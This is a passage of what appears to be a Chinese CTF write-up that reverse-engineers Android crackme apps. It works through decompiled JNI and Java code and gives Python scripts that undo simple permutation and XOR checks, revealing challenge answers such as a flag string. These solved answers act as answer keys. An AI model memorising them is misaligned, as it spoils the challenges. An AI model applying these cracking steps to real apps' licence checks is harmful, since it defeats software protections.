r6</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v6; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// r1</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  str_1 = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, str, <span class="number">0</span>);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(str_1);</span><br><span class="line">  v6 = (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(v5 + <span class="number">1</span>);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">-1</span> )</span><br><span class="line">    v7 = <span class="number">1</span>;</span><br><span class="line">  _aeabi_memclr(&amp;v6[v5], v7);</span><br><span class="line">  _aeabi_memcpy((<span class="keyword">int</span>)v6, (<span class="keyword">int</span>)str_1, v5);</span><br><span class="line">  j_TestDec((<span class="keyword">int</span>)v6);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v6, <span class="string">"f72c5a36569418a20907b55be5bf95ad"</span>) )</span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下 TestDec 发现和之前一样，也是一组简单置换：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> __<span class="function">fastcall <span class="title">TestDec</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *str; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">size_t</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// r1</span></span><br><span class="line"></span><br><span class="line">  str = (<span class="keyword">char</span> *)a1;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1) &gt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = &amp;str[i];</span><br><span class="line">      v4 = str[i];</span><br><span class="line">      str[i] = str[i + <span class="number">16</span>];</span><br><span class="line">      ++i;</span><br><span class="line">      v3[<span class="number">16</span>] = v4;                              <span class="comment">// str[i], str[i + 16] = str[i + 16], str[i]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( i &lt; <span class="built_in">strlen</span>(str) &gt;&gt; <span class="number">1</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  result = (<span class="keyword">unsigned</span> __int8)*str;</span><br><span class="line">  <span class="keyword">if</span> ( !*str )</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  *str = str[<span class="number">1</span>];</span><br><span class="line">  str[<span class="number">1</span>] = result;                              <span class="comment">// str[0], str[1] = str[1], str[0]</span></span><br><span class="line">  result = <span class="built_in">strlen</span>(str);</span><br><span class="line">  <span class="keyword">if</span> ( result &lt; <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = &amp;str[j];</span><br><span class="line">    v8 = str[j + <span class="number">2</span>];</span><br><span class="line">    v7[<span class="number">2</span>] = str[j + <span class="number">3</span>];</span><br><span class="line">    v7[<span class="number">3</span>] = v8;                                 <span class="comment">// str[j + 2], str[j + 3] = str[j + 3], str[j + 2]</span></span><br><span class="line">    result = <span class="built_in">strlen</span>(str);</span><br><span class="line">    v9 = j + <span class="number">4</span>;</span><br><span class="line">    j += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v9 &lt; result );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>照样学样逆一下就好了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">ciphertext = <span class="string">'f72c5a36569418a20907b55be5bf95ad'</span></span><br><span class="line">ciphertext = [ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> ciphertext]</span><br><span class="line">ciphertext[<span class="number">0</span>], ciphertext[<span class="number">1</span>] = ciphertext[<span class="number">1</span>], ciphertext[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ciphertext) / <span class="number">2</span> - <span class="number">1</span>):</span><br><span class="line">    ciphertext[<span class="number">2</span> * i + <span class="number">2</span>], ciphertext[<span class="number">2</span> * i + <span class="number">3</span>] = ciphertext[<span class="number">2</span> * i + <span class="number">3</span>], ciphertext[<span class="number">2</span> * i + <span class="number">2</span>]</span><br><span class="line"><span class="keyword">print</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ciphertext) / <span class="number">2</span>):</span><br><span class="line">    ciphertext[i], ciphertext[i + <span class="number">16</span>] = ciphertext[i + <span class="number">16</span>], ciphertext[i]</span><br><span class="line"><span class="keyword">print</span> ciphertext</span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">''</span>.join([chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> ciphertext])</span><br><span class="line"><span class="keyword">print</span> plaintext</span><br><span class="line"><span class="comment"># 90705bb55efb59da7fc2a5636549812a</span></span><br></pre></td></tr></table></figure><h1 id="Ph0en1x-100"><a href="#Ph0en1x-100" class="headerlink" title="Ph0en1x-100"></a>Ph0en1x-100</h1><p>MainActivity 中，encrypt 和 getFlag 函数在 Native 层实现，getSecret 函数返回某种哈希摘要的十六进制字符串。输入经过 encrypt 函数操作后的值与 getFlag 的值相等：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ph0en1x.android_crackme;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v4.view.MotionEventCompat;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    EditText etFlag;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">encrypt</span><span class="params">(String str)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">getFlag</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"phcm"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_main);</span><br><span class="line">        <span class="keyword">this</span>.etFlag = (EditText) findViewById(R.id.flag_edit);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onGoClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (getSecret(getFlag()).equals(getSecret(encrypt(<span class="keyword">this</span>.etFlag.getText().toString())))) &#123;</span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>, <span class="string">"Success"</span>, <span class="number">1</span>).show();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>, <span class="string">"Failed"</span>, <span class="number">1</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSecret</span><span class="params">(String string)</span> </span>&#123; <span class="comment">// 获取某种哈希摘要的十六进制字符串</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] hash = MessageDigest.getInstance(encrypt(<span class="string">"KE3TLNE6M43EK4GM34LKMLETG"</span>).substring(<span class="number">5</span>, <span class="number">8</span>)).digest(string.getBytes(<span class="string">"UTF-8"</span>));</span><br><span class="line">            <span class="keyword">if</span> (hash != <span class="keyword">null</span>) &#123;</span><br><span class="line">                StringBuilder hex = <span class="keyword">new</span> StringBuilder(hash.length * <span class="number">2</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">byte</span> b : hash) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((b &amp; MotionEventCompat.ACTION_MASK) &lt; <span class="number">16</span>) &#123;</span><br><span class="line">                        hex.append(<span class="string">"0"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    hex.append(Integer.toHexString(b &amp; MotionEventCompat.ACTION_MASK));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> hex.toString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e2) &#123;</span><br><span class="line">            e2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 IDA 中看到静态注册的 encrypt 函数，对字符串的每个值进行了减一操作：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">jstring __<span class="function">fastcall <span class="title">Java_com_ph0en1x_android_1crackme_MainActivity_encrypt</span><span class="params">(_JNIEnv *a1, <span class="keyword">int</span> a2, jstring a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _JNIEnv *v3; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *i; <span class="comment">// r5</span></span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  v4 = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, a3, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = v4; i - v4 &lt; <span class="built_in">strlen</span>(v4); ++i )</span><br><span class="line">    --*i;</span><br><span class="line">  <span class="keyword">return</span> v3-&gt;functions-&gt;NewStringUTF(&amp;v3-&gt;functions, v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反向加一，得到指定的哈希摘要是 MD5：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">md5hash = <span class="keyword">lambda</span> m: hashlib.md5(m).hexdigest()</span><br><span class="line"></span><br><span class="line">secret_digest = <span class="string">'KE3TLNE6M43EK4GM34LKMLETG'</span></span><br><span class="line">digest_type = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(secret_digest)):</span><br><span class="line">    digest_type += chr(ord(secret_digest[i]) - <span class="number">1</span>)</span><br><span class="line">digest_type = digest_type[<span class="number">5</span>:<span class="number">8</span>]</span><br><span class="line"><span class="keyword">print</span> digest_type</span><br><span class="line"><span class="comment"># MD5</span></span><br></pre></td></tr></table></figure><p>接下来看 getFlag 函数，读取内存中 data 的值，在循环中对相邻两个值进行相减并加 1，然后和 key 值异或，最后返回字符串：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">jstring __<span class="function">fastcall <span class="title">Java_com_ph0en1x_android_1crackme_MainActivity_getFlag</span><span class="params">(_JNIEnv *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// r4</span></span><br><span class="line">  _JNIEnv *v2; <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// r0</span></span><br><span class="line">  __int16 v12; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> l1; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> l2; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> *v15; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">char</span> a; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">char</span> b; <span class="comment">// t1</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+4h] [bp-5Ch]</span></span><br><span class="line">  <span class="keyword">char</span> data_1[<span class="number">40</span>]; <span class="comment">// [sp+14h] [bp-4Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [sp+40h] [bp-20h]</span></span><br><span class="line"></span><br><span class="line">  v1 = data_1;</span><br><span class="line">  v2 = a1;</span><br><span class="line">  v3 = (<span class="keyword">char</span> *)&amp;data;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(_DWORD *)v3;                         <span class="comment">// low 4 bytes</span></span><br><span class="line">    v3 += <span class="number">8</span>;</span><br><span class="line">    v5 = *((_DWORD *)v3 - <span class="number">1</span>);                   <span class="comment">// high 4 bytes</span></span><br><span class="line">    *(_DWORD *)v1 = v4;</span><br><span class="line">    *((_DWORD *)v1 + <span class="number">1</span>) = v5;</span><br><span class="line">    v1 += <span class="number">8</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 != <span class="string">"Hello Ph0en1x"</span> );</span><br><span class="line">  v6 = &amp;s;</span><br><span class="line">  v7 = <span class="string">"Hello Ph0en1x"</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = *(_DWORD *)v7;</span><br><span class="line">    v7 += <span class="number">8</span>;</span><br><span class="line">    v9 = *((_DWORD *)v7 - <span class="number">1</span>);</span><br><span class="line">    *(_DWORD *)v6 = v8;</span><br><span class="line">    *((_DWORD *)v6 + <span class="number">1</span>) = v9;</span><br><span class="line">    v10 = (<span class="keyword">int</span>)(v6 + <span class="number">8</span>);</span><br><span class="line">    v6 += <span class="number">8</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v7 != <span class="string">"0en1x"</span> );</span><br><span class="line">  v11 = *(_DWORD *)v7;</span><br><span class="line">  v12 = *((_WORD *)v7 + <span class="number">2</span>);</span><br><span class="line">  *(_DWORD *)v10 = v11;</span><br><span class="line">  *(_WORD *)(v10 + <span class="number">4</span>) = v12;</span><br><span class="line">  l1 = <span class="built_in">strlen</span>(&amp;s);                              <span class="comment">// len('Hello Ph0en1x')</span></span><br><span class="line">  l2 = <span class="built_in">strlen</span>(data_1) - <span class="number">1</span>;                      <span class="comment">// len(data) - 1</span></span><br><span class="line">  v15 = &amp;data_1[l2];</span><br><span class="line">  <span class="keyword">while</span> ( l2 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    a = *v15 + <span class="number">1</span>;</span><br><span class="line">    *v15 = a;                                   <span class="comment">// data[l2] = data[l2] + 1</span></span><br><span class="line">    b = *(v15-- - <span class="number">1</span>);                           <span class="comment">// data[l2 - 1]</span></span><br><span class="line">    idx = l2-- % l1;                            <span class="comment">// l2 % l1</span></span><br><span class="line">    v15[<span class="number">1</span>] = ((a - b) ^ *(&amp;v22 + idx - <span class="number">60</span>)) - <span class="number">1</span>;<span class="comment">// data[l2] = ((data[l2 + 1] - data[l2 - 1]) ^ s[idx]) - 1</span></span><br><span class="line">  &#125;</span><br><span class="line">  data_1[<span class="number">0</span>] = (data_1[<span class="number">0</span>] ^ <span class="number">0x48</span>) - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> v2-&gt;functions-&gt;NewStringUTF(&amp;v2-&gt;functions, data_1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为涉及到了异或和减法的操作，需要注意到及时和 0xFF 与一下，不然结果会出错。脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">0x2E</span>, <span class="number">0x36</span>, <span class="number">0x42</span>, <span class="number">0x4C</span>, <span class="number">0x5F</span>, <span class="number">0xBF</span>, <span class="number">0xE0</span>, <span class="number">0x3A</span>, <span class="number">0xA8</span>, <span class="number">0xC3</span>, <span class="number">0x20</span>, <span class="number">0x63</span>, <span class="number">0x89</span>, <span class="number">0xB7</span>, <span class="number">0xC0</span>, <span class="number">0x1C</span>, <span class="number">0x1D</span>, <span class="number">0x44</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0x7F</span>, <span class="number">0xED</span>, <span class="number">0x02</span>, <span class="number">0x0E</span>, <span class="number">0x5D</span>, <span class="number">0x66</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0xB5</span>, <span class="number">0xB7</span>, <span class="number">0xD0</span>, <span class="number">0x16</span>, <span class="number">0x4D</span>, <span class="number">0x83</span>, <span class="number">0xF8</span>, <span class="number">0xFB</span>, <span class="number">0x01</span>, <span class="number">0x43</span>, <span class="number">0x47</span>]</span><br><span class="line">key = <span class="string">'Hello Ph0en1x'</span></span><br><span class="line">l1 = len(key)</span><br><span class="line">l2 = len(data)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(l2 - <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">    data[i] = (((data[i] + <span class="number">1</span> - data[i - <span class="number">1</span>]) ^ ord(key[i % l1])) &amp; <span class="number">0xFF</span>) - <span class="number">1</span></span><br><span class="line">data[<span class="number">0</span>] = (data[<span class="number">0</span>] ^ <span class="number">0x48</span>) - <span class="number">1</span></span><br><span class="line">flag = <span class="string">''</span>.join([chr(c + <span class="number">1</span>) <span class="keyword">for</span> c <span class="keyword">in</span> data])</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="comment"># flag&#123;Ar3_y0u_go1nG_70_scarborough_Fair&#125;</span></span><br></pre></td></tr></table></figure><h1 id="RememberOther"><a href="#RememberOther" class="headerlink" title="RememberOther"></a>RememberOther</h1><p>这道题简直出的莫名其妙，发现如果用户名和密码都为空会返回 True，并且会弹出 strings.xml 中指向的 successed 字符串：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.droider.crackme0201;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v4.view.MotionEventCompat;</span><br><span class="line"><span class="keyword">import</span> android.view.Menu;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Button btn_register;</span><br><span class="line">    <span class="keyword">private</span> EditText edit_sn;</span><br><span class="line">    <span class="keyword">private</span> EditText edit_userName;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        setTitle(R.string.unregister);</span><br><span class="line">        <span class="keyword">this</span>.edit_userName = (EditText) findViewById(R.id.edit_username);</span><br><span class="line">        <span class="keyword">this</span>.edit_sn = (EditText) findViewById(R.id.edit_sn);</span><br><span class="line">        <span class="keyword">this</span>.btn_register = (Button) findViewById(R.id.button_register);</span><br><span class="line">        <span class="keyword">this</span>.btn_register.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.checkSN(MainActivity.<span class="keyword">this</span>.edit_userName.getText().toString().trim(), 